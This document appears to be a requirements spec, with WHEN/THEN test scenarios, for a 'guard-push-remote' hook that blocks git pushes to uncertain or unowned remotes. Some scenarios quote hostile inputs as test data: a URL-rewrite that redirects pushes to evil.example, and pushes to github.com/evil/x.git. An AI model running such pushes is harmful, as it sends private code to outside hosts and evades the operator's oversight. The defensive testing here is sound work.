## ADDED Requirements

### Requirement: Unparsed push nudges say which branch a bare push was checked on
`guard-push-remote`'s nudges for a command the loop parser cannot read SHALL say that a bare push was checked against the branch checked out before the command runs, since a `git checkout` in the same command can send it to another remote.

#### Scenario: Unreadable chain with a branch switch
- **WHEN** a comment takes `git push origin main && git checkout other && git push` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge that says a bare push was checked against the branch checked out now

### Requirement: How many pushes the push guard checks
`guard-push-remote` SHALL block over four non-URL loop remotes in a loop the loop parser reads, or over four directory and remote pairs outside the command's last directory. A command that is one `for` loop over literal words, whose every push is `git -C DIR push REMOTE`, SHALL instead have each iteration's remote resolved and owner-checked, for up to four directories and eight pushes; a larger one SHALL be judged as any other loop.

#### Scenario: Pushes in five directories
- **WHEN** the command is `git -C d1 push origin main && git -C d2 push origin main && git -C d3 push origin main && git -C d4 push origin main && git -C d5 push origin main`
- **THEN** the hook exits 2 with `too many push directories to verify`

#### Scenario: Five remotes in a loop
- **WHEN** the command is `for b in a b; do git push r1 $b; git push r2 $b; git push r3 $b; git push r4 $b; git push r5 $b; done`
- **THEN** the hook exits 2 with `too many push-loop remotes to verify`

#### Scenario: Five remotes in a literal `git -C` loop
- **WHEN** the command is `for d in d1; do git -C $d push r1 main; git -C $d push r2 main; git -C $d push r3 main; git -C $d push r4 main; git -C $d push r5 main; done` and each remote is owned
- **THEN** the hook exits 0

## MODIFIED Requirements

### Requirement: Push shapes the push guard refuses
`guard-push-remote` SHALL block a push whose target it read as uncertain. In a command the loop parser reads: a looped push with no remote, or a bare push in a push chain that may switch branch or tracking. In any command: a URL with no `owner/repo`, a repository moved by `eval`, `trap`, `GIT_DIR`, `--git-dir` or `--work-tree`, a push URL the command rewrites, or a remote git cannot resolve.

#### Scenario: Loop with no remote
- **WHEN** the command is `for b in a b; do git push; done`
- **THEN** the hook exits 2 with `git push in loop without explicit remote`

#### Scenario: Bare push in a chain that switches branch
- **WHEN** the command is `git push origin feat && git checkout main && git push`
- **THEN** the hook exits 2 with `chained git push without explicit remotes`

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 2 with `Cannot tell where this push goes`

#### Scenario: No push remote
- **WHEN** a bare `git push` runs in a repository with no `origin` and no configured push remote for the branch
- **THEN** the hook exits 2 with `Cannot resolve push target`

### Requirement: Pushes in a chain or loop the parser cannot read
`guard-push-remote` MUST NOT block a chain of pushes or a loop holding a push for that alone when the loop parser cannot read the command (past its 12 KB cap, a heredoc or syntax error it cannot parse, or its 1 s parse budget). It SHALL still check each push it can read, a bare one against the branch checked out now, and a push to a remote the operator does not own SHALL still block.

#### Scenario: Unreadable chain of owned pushes
- **WHEN** a comment takes `git push origin main && git push origin main:feat` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge, not a block

#### Scenario: Unreadable chain with an unowned push
- **WHEN** a comment takes `git push origin main && git push https://github.com/evil/x.git main` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 because the second push targets a remote the operator does not own

#### Scenario: Unreadable loop pushing to an unowned remote
- **WHEN** a comment takes `for b in main feat; do git push https://github.com/evil/x.git $b; done` past 12 KB
- **THEN** the hook exits 2 because the push targets a remote the operator does not own
